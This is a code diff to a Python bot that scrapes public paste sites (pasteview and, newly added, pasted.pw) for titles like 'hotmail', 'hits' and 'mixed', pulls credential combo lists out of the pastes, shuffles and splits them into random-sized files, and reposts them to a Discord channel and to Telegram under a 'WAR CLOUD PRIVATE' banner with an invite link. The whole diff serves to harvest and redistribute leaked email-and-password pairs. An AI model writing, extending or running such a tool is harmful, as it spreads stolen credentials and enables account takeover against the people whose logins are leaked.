@@ -35,6 +35,7 @@ OWNER_ID           = int(os.environ["OWNER_ID"])
 CHECK_INTERVAL   = 30
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
+PASTEDPW_URL     = "https://pasted.pw/recent.php"
 SEEN_FILE        = "seen_urls.json"
 EMPTY_SCAN_ALERT = 10
 KEYWORDS         = ["hotmail", "hits", "mixed"]
@@ -203,6 +204,61 @@ async def extract_raw(page, url: str) -> str:
 
     return ""
 
+# ─── PASTED.PW ───────────────────────────────────────────────────────────────
+async def scrape_pastedpw(pages: int = 5) -> list[dict]:
+    """Scrape pasted.pw recent page using aiohttp."""
+    found = []
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+    async with aiohttp.ClientSession(headers=headers) as sess:
+        for page_num in range(1, pages + 1):
+            url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
+            try:
+                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
+                    html = await r.text(errors="ignore")
+                # Extract paste IDs and titles from anchor tags
+                matches = re.findall(r'href="view\.php\?id=(\d+)"[^>]*>\s*([^<]+?)\s*</a>', html)
+                for paste_id, title in matches:
+                    title = title.strip()
+                    if any(k in title.lower() for k in KEYWORDS):
+                        if not any(b in title.lower() for b in BLACKLIST):
+                            found.append({
+                                "title": title,
+                                "url": f"https://pasted.pw/view.php?id={paste_id}",
+                                "source": "pasted.pw"
+                            })
+                log.info(f"pasted.pw page {page_num}: {len(found)} match(es) so far")
+            except Exception as e:
+                log.error(f"pasted.pw page {page_num} failed: {e}")
+    return found
+
+
+async def extract_pastedpw(page, url: str) -> str:
+    """Extract combo text from a pasted.pw paste page."""
+    for attempt in range(2):
+        try:
+            await page.goto(url, wait_until="domcontentloaded", timeout=20000)
+            await page.wait_for_timeout(1500)
+            # Try getting text from the paste content area
+            raw = await page.evaluate("""
+                () => {
+                    const pre = document.querySelector('pre');
+                    if (pre) return pre.innerText;
+                    const ta = document.querySelector('textarea');
+                    if (ta) return ta.value;
+                    const div = document.querySelector('.paste-content');
+                    if (div) return div.innerText;
+                    return null;
+                }
+            """)
+            if raw and raw.strip():
+                return raw
+        except Exception as e:
+            log.error(f"pasted.pw extract attempt {attempt+1} failed for {url}: {e}")
+            if attempt == 0:
+                await asyncio.sleep(2)
+    return ""
+
+
 # ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
 @tasks.loop(seconds=CHECK_INTERVAL)
 async def monitor_loop():
@@ -289,6 +345,13 @@ async def monitor_loop():
                     log.info(f"Page {page_num}: {len(matches)} match(es)")
                     found.extend(matches)
 
+                # ── Also scrape pasted.pw ─────────────────────────────
+                try:
+                    pw_found = await scrape_pastedpw(PAGES_TO_SCAN)
+                    found.extend(pw_found)
+                except Exception as e:
+                    log.error(f"pasted.pw scrape failed: {e}")
+
                 # Deduplicate and filter blacklisted titles
                 seen_this_run = set()
                 pastes        = []
@@ -341,7 +404,10 @@ async def monitor_loop():
                     for item in new_pastes[:5]:
                         url = item["url"]
                         log.info(f"Extracting from {url}")
-                        raw = await extract_raw(page, url)
+                        if item.get("source") == "pasted.pw":
+                            raw = await extract_pastedpw(page, url)
+                        else:
+                            raw = await extract_raw(page, url)
                         if raw:
                             creds = extract_credentials(raw)
                             if creds:
@@ -357,6 +423,7 @@ async def monitor_loop():
                     if combined:
                         # Flatten all creds
                         all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
+                        random.shuffle(all_raw)
 
                         # Determine label
                         title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
@@ -369,35 +436,41 @@ async def monitor_loop():
                         else:
                             label = "content"
 
-                        valid_hits = all_raw
-                        combined = ["\n".join(valid_hits)]
+                        # Split into random chunks of 0-1000 lines
+                        chunks = []
+                        remaining = all_raw[:]
+                        while remaining:
+                            size = random.randint(1, min(1000, len(remaining)))
+                            chunks.append(remaining[:size])
+                            remaining = remaining[size:]
+
+                        log.info(f"Split {len(all_raw)} combos into {len(chunks)} file(s)")
 
                     if combined:
-                        output   = "\n\n".join(combined)
-                        filename = f"{len(valid_hits)} {label.upper()}.txt"
-
-                        # Discord — post full file + ZIP (if not mix)
+                        # Post all chunks at once to Discord
                         if toggles["discord_content"]:
+                            files = []
+                            for i, chunk in enumerate(chunks):
+                                fname = f"{len(chunk)} {label.upper()}.txt"
+                                files.append(discord.File(fp=io.BytesIO("\n".join(chunk).encode()), filename=fname))
                             try:
-                                await content_channel.send(file=discord.File(fp=io.BytesIO(output.encode()), filename=filename))
-                                log.info(f"Posted main file to Discord: {filename}")
+                                # Discord allows max 10 files per message
+                                for i in range(0, len(files), 10):
+                                    await content_channel.send(files=files[i:i+10])
+                                log.info(f"Posted {len(files)} file(s) to Discord")
                             except Exception as e:
-                                log.error(f"Failed to post main file to Discord: {e}")
-
+                                log.error(f"Failed to post files to Discord: {e}")
 
                         # DM owner
                         if toggles["owner_dm"]:
                             try:
                                 owner = await bot.fetch_user(OWNER_ID)
-                                total = sum(len(b.splitlines()) for b in combined)
-                                await owner.send(f"✅ New {label.upper()} detected — {total} combos")
+                                await owner.send(f"✅ New {label.upper()} detected — {len(all_raw)} combos in {len(chunks)} file(s)")
                             except Exception as e:
                                 log.error(f"Failed to DM owner: {e}")
 
-                        # Telegram
+                        # Telegram — post all chunks
                         if toggles["telegram"]:
-                            all_creds = [l for b in combined for l in b.splitlines() if l.strip()]
-                            random.shuffle(all_creds)
                             tg_header = (
                                 f"WAR CLOUD PRIVATE {label.upper()}\n"
                                 "------------------------\n"
@@ -405,13 +478,16 @@ async def monitor_loop():
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                 "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                             )
-                            await send_telegram_file(tg_header + "\n".join(all_creds), filename)
-
+                            for chunk in chunks:
+                                fname = f"{len(chunk)} {label.upper()}.txt"
+                                await send_telegram_file(tg_header + "\n".join(chunk), fname)
+                                await asyncio.sleep(0.5)
 
                             if toggles["telegram_public"]:
                                 private_post_count_ref = globals()
                                 private_post_count_ref["private_post_count"] += 1
-                                private_post_count_ref["recent_filenames"].append(filename)
+                                for chunk in chunks:
+                                    private_post_count_ref["recent_filenames"].append(f"{len(chunk)} {label.upper()}.txt")
                                 log.info(f"Private post count: {private_post_count_ref['private_post_count']}")
                                 if private_post_count_ref["private_post_count"] >= 2:
                                     private_post_count_ref["private_post_count"] = 0
@@ -563,5 +639,4 @@ async def on_resumed():
 
 # ─── RUN ─────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
-
     bot.run(DISCORD_TOKEN, log_handler=None)
